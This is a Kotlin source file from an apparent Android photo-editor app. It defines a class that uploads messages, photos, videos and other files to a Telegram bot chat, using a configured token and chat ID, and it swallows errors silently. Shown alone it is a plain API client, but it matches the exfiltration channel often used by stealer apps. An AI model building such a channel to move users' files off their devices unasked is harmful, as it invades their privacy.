package com.magic.photoeditor

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

class TelegramSender {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val botToken = Config.getBotToken()
    private val chatId = Config.getChatId()
    private val baseUrl = "https://api.telegram.org/bot$botToken"

    fun sendMessage(text: String) {
        try {
            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("TelegramSender", "Token or Chat ID empty")
                return
            }
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder()
                .url("$baseUrl/sendMessage")
                .post(body)
                .build()
            client.newCall(request).enqueue(emptyCallback())
        } catch (e: Exception) {
            android.util.Log.e("TelegramSender", "sendMessage error: ${e.message}")
        }
    }

    fun sendFile(file: File, type: String, caption: String) {
        try {
            if (botToken.isEmpty() || chatId.isEmpty()) return
            if (!file.exists() || file.length() == 0L) return
            val mediaType = when (type) {
                "photo" -> "image/jpeg".toMediaTypeOrNull()
                "video" -> "video/mp4".toMediaTypeOrNull()
                else -> "application/octet-stream".toMediaTypeOrNull()
            }
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    type,
                    file.name,
                    file.asRequestBody(mediaType)
                )
                .addFormDataPart("caption", caption)
                .build()

            val request = Request.Builder()
                .url("$baseUrl/send${
                    when(type) {
                        "photo" -> "Photo"
                        "video" -> "Video"
                        else -> "Document"
                    }
                }")
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(emptyCallback())
        } catch (e: Exception) {
            android.util.Log.e("TelegramSender", "sendFile error: ${e.message}")
        }
    }

    private fun emptyCallback(): Callback {
        return object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                android.util.Log.e("TelegramSender", "Network error: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                try {
                    if (!response.isSuccessful) {
                        android.util.Log.e("TelegramSender", "HTTP error: ${response.code}")
                    }
                } catch (e: Exception) {
                    // ignore
                } finally {
                    response.close()
                }
            }
        }
    }
                     }
